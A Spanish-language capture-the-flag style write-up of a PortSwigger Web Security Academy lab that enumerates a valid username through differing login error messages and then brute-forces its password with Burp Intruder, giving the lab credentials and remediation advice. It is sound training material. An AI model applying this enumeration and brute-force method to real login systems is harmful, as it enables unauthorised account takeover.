@@ -1,0 +1,396 @@
+# Username Enumeration via Different Responses
+
+**Lab:** Username Enumeration via Different Responses  
+**Categoría:** Authentication Vulnerabilities  
+**Dificultad:** Apprentice  
+**Plataforma:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+La aplicación de autenticación devuelve mensajes de error diferentes dependiendo de si el nombre de usuario existe o no en el sistema.
+
+Esta diferencia permite a un atacante enumerar usuarios válidos antes de realizar un ataque de fuerza bruta sobre sus contraseñas, reduciendo significativamente el espacio de búsqueda y aumentando la probabilidad de éxito.
+
+Una vez identificado un usuario válido, se realizó un segundo ataque de fuerza bruta sobre la contraseña hasta obtener credenciales válidas y acceder a la cuenta.
+
+---
+
+# Vulnerability Classification
+
+| Atributo | Valor |
+|----------|-------|
+| Vulnerabilidad | Username Enumeration |
+| CWE | CWE-203 – Observable Discrepancy |
+| CWE | CWE-204 – Observable Response Discrepancy |
+| OWASP Top 10 | A07:2021 – Identification and Authentication Failures |
+| Severidad | Medium |
+| CVSS v3.1 | 5.3 (Medium) |
+
+---
+
+# Objetivo
+
+Identificar un nombre de usuario válido mediante diferencias en las respuestas del proceso de autenticación y, posteriormente, descubrir su contraseña mediante fuerza bruta.
+
+---
+
+# Metodología
+
+1. Interceptar una petición de autenticación.
+2. Enumerar nombres de usuario mediante Burp Intruder.
+3. Identificar el usuario válido analizando las diferencias en la respuesta.
+4. Realizar un segundo ataque de fuerza bruta sobre la contraseña.
+5. Acceder con las credenciales obtenidas.
+6. Resolver el laboratorio.
+
+---
+
+# Enumeración de Usuarios
+
+Se realizó un intento de autenticación con credenciales arbitrarias.
+
+Petición capturada:
+
+```http
+POST /login HTTP/2
+Host: LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+username=test&password=test
+```
+
+La petición fue enviada a **Burp Intruder**.
+
+---
+
+## Configuración del ataque
+
+**Attack Type**
+
+```
+Sniper
+```
+
+**Payload Position**
+
+```text
+username=§test§
+```
+
+**Payload Type**
+
+```
+Simple List
+```
+
+Se utilizó la lista de nombres de usuario proporcionada por el laboratorio.
+
+---
+
+# Identificación del Usuario Válido
+
+Tras finalizar el ataque se ordenaron los resultados por la columna **Length**.
+
+La mayoría de respuestas devolvían:
+
+```text
+Invalid username
+```
+
+Sin embargo, un único usuario produjo una respuesta distinta:
+
+```text
+Incorrect password
+```
+
+Usuario identificado:
+
+```text
+agenda
+```
+
+La diferencia en el contenido de la respuesta confirmó que el usuario existía en la aplicación.
+
+---
+
+# Fuerza Bruta de Contraseña
+
+Se modificó la petición dejando fijo el nombre de usuario descubierto.
+
+Petición utilizada:
+
+```http
+POST /login HTTP/2
+
+username=agenda&password=§password§
+```
+
+Se configuró Burp Intruder con:
+
+**Attack Type**
+
+```
+Sniper
+```
+
+**Payload**
+
+Lista de contraseñas proporcionada por el laboratorio.
+
+---
+
+# Identificación de la Contraseña
+
+Tras finalizar el ataque se ordenaron los resultados por la columna **Status**.
+
+La mayoría devolvieron:
+
+```http
+HTTP/2 200 OK
+```
+
+Una única petición respondió con:
+
+```http
+HTTP/2 302 Found
+```
+
+La contraseña correspondiente fue:
+
+```text
+trustno1
+```
+
+---
+
+# Credenciales Obtenidas
+
+| Campo | Valor |
+|--------|-------|
+| Usuario | `agenda` |
+| Contraseña | `trustno1` |
+
+---
+
+# Acceso al Sistema
+
+Se inició sesión utilizando las credenciales obtenidas:
+
+```text
+Username: agenda
+Password: trustno1
+```
+
+El acceso fue exitoso y permitió visualizar la página **My Account**, resolviendo el laboratorio.
+
+---
+
+# Evidencias HTTP
+
+## Enumeración de Usuarios
+
+```http
+POST /login HTTP/2
+
+username=agenda&password=test
+```
+
+Respuesta:
+
+```text
+Incorrect password
+```
+
+---
+
+## Enumeración de Contraseñas
+
+```http
+POST /login HTTP/2
+
+username=agenda&password=trustno1
+```
+
+Respuesta:
+
+```http
+HTTP/2 302 Found
+Location: /my-account
+```
+
+---
+
+# Análisis Técnico
+
+El flujo de autenticación diferencia entre dos escenarios:
+
+**Usuario inexistente**
+
+```text
+Invalid username
+```
+
+**Usuario existente con contraseña incorrecta**
+
+```text
+Incorrect password
+```
+
+Conceptualmente, la aplicación implementa una lógica similar a:
+
+```php
+$user = findUser($username);
+
+if (!$user) {
+    return "Invalid username";
+}
+
+if (!password_verify($password, $user->password)) {
+    return "Incorrect password";
+}
+```
+
+Esta diferencia permite confirmar la existencia de un usuario sin conocer su contraseña.
+
+Una vez identificado un usuario válido, el atacante únicamente necesita probar distintas contraseñas hasta obtener una autenticación satisfactoria.
+
+---
+
+# Root Cause
+
+La aplicación proporciona respuestas distintas durante el proceso de autenticación dependiendo del motivo del fallo.
+
+Estas diferencias permiten distinguir entre usuarios existentes y usuarios inexistentes.
+
+---
+
+# Impacto
+
+Un atacante puede:
+
+- Enumerar usuarios válidos.
+- Reducir significativamente el espacio de búsqueda de un ataque de fuerza bruta.
+- Obtener credenciales válidas.
+- Comprometer cuentas de usuario.
+- Facilitar ataques de credential stuffing y password spraying.
+
+---
+
+# Flujo del Ataque
+
+```text
+Intento de Login
+        │
+        ▼
+¿Existe el usuario?
+        │
+ ┌──────┴────────┐
+ │               │
+No              Sí
+ │               │
+ ▼               ▼
+Invalid      Incorrect
+username      password
+                    │
+                    ▼
+Usuario válido identificado
+                    │
+                    ▼
+Fuerza bruta sobre contraseña
+                    │
+                    ▼
+302 Found
+                    │
+                    ▼
+Acceso autorizado
+```
+
+---
+
+# Security Recommendations
+
+## Unificar los mensajes de error
+
+Mostrar siempre un mensaje genérico:
+
+```text
+Invalid username or password.
+```
+
+independientemente de si el error corresponde al usuario o a la contraseña.
+
+---
+
+## Igualar las respuestas
+
+Las respuestas de autenticación deben tener:
+
+- El mismo código HTTP.
+- El mismo tamaño.
+- El mismo tiempo de respuesta.
+- El mismo contenido.
+
+---
+
+## Implementar Rate Limiting
+
+Limitar el número de intentos de autenticación por:
+
+- Dirección IP.
+- Usuario.
+- Sesión.
+
+---
+
+## Bloqueo temporal de cuentas
+
+Aplicar bloqueos progresivos tras múltiples intentos fallidos.
+
+---
+
+## Implementar MFA
+
+La autenticación multifactor reduce el impacto incluso cuando un atacante consigue credenciales válidas.
+
+---
+
+## Monitorizar intentos de autenticación
+
+Detectar patrones compatibles con:
+
+- Username Enumeration.
+- Password Spraying.
+- Credential Stuffing.
+- Fuerza bruta.
+
+---
+
+# Referencias
+
+- OWASP Top 10 2021 – A07: Identification and Authentication Failures
+- CWE-203 – Observable Discrepancy
+- CWE-204 – Observable Response Discrepancy
+- PortSwigger Web Security Academy – Username Enumeration via Different Responses
+
+---
+
+# Conclusión
+
+La aplicación era vulnerable a **Username Enumeration** debido a que diferenciaba el motivo del fallo durante el proceso de autenticación.
+
+Mediante el análisis de las respuestas fue posible identificar el usuario **`agenda`**. Posteriormente, un ataque de fuerza bruta sobre la contraseña permitió obtener la credencial **`trustno1`**, acceder a la cuenta y completar el laboratorio.
+
+---
+
+## Key Takeaways
+
+- Los mensajes de autenticación nunca deben revelar si un usuario existe.
+- Las respuestas de error deben ser indistinguibles en contenido, longitud, código HTTP y tiempo de respuesta.
+- La enumeración de usuarios reduce drásticamente la complejidad de un ataque de fuerza bruta.
+- La combinación de respuestas diferenciadas y ausencia de controles anti-fuerza bruta supone un riesgo elevado para la seguridad de las cuentas.
+
+---
+
+**Lab Status:** ✅ Solved
